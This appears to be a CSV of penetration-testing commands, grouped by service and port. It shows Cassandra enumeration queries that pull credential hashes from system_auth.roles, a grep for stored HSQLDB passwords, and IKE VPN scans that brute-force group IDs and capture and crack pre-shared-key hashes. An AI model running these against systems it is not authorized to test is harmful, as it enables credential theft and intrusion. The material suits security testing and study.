Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
Cassandra,9042,None,NoNameAdded,No Description,"# pip install cqlsh
cqlsh <IP>
#Basic info enumeration
SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
#Keyspace enumeration
SELECT keyspace_name FROM system.schema_keyspaces;
desc <Keyspace_name>    #Decribe that DB
desc system_auth        #Describe the DB called system_auth
SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
SELECT * from logdb.user_auth;    #Can contain credential hashes
SELECT * from logdb.user;
SELECT * from configuration.""config"";
",Unverified,1
Cassandra,9042,None,NoNameAdded,No Description,"nmap -sV --script cassandra-info -p <PORT> {IP}
",Unverified,1
BACNet,47808,None,NoNameAdded,No Description,"# pip3 install BAC0
import BAC0
bbmdIP = '<IP>:47808'
bbmdTTL = 900
bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL) #Connect
bacnet.vendorName.strValue
#I couldn't find how to obtain the same data as nmap with this library or any other
#talk me if you know how please
",Unverified,1
BACNet,47808,None,NoNameAdded,No Description,"nmap --script bacnet-info --script-args full=yes -sU -n -sV -p 47808 {IP}
",Unverified,1
AJP,8009,None,NoNameAdded,No Description,"nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 {IP}
",Unverified,1
HSQLDB,9001,None,NoNameAdded,No Description,"# grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo ""--trans=$ENC,$HASH,$AUTH,$GROUP"" >> ike-dict.txt ;done ;done ;done ;done
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Valid trans found: $line"" && sudo ike-scan -M $line {IP}) | grep -B14 ""1 returned handshake"" | grep ""Valid trans found"" ; done < ike-dict.txt
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Valid trans found: $line"" && ike-scan -M --aggressive -P handshake.txt $line {IP}) | grep -B7 ""SA="" | grep ""Valid trans found"" ; done < ike-dict.txt
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py -s1 -a {IP} #-s1 for max speed
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"ike-scan -P -M -A -n fakeID {IP}
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Found ID: $line"" && sudo ike-scan -M -A -n $line {IP}) | grep -B14 ""1 returned handshake"" | grep ""Found ID:""; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"# git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py {IP} -e -w ./wordlists/groupnames.dic
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"ike-scan -M -A -n <ID> --pskcrack=hash.txt {IP} #If aggressive mode is supported and you know the id, you can get the hash of the passwor
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"psk-crack -d <Wordlist_path> psk.txt #To crack the hash
#You can also crack it using john (using ikescan2john.py) and hashcat.
",Unverified,1
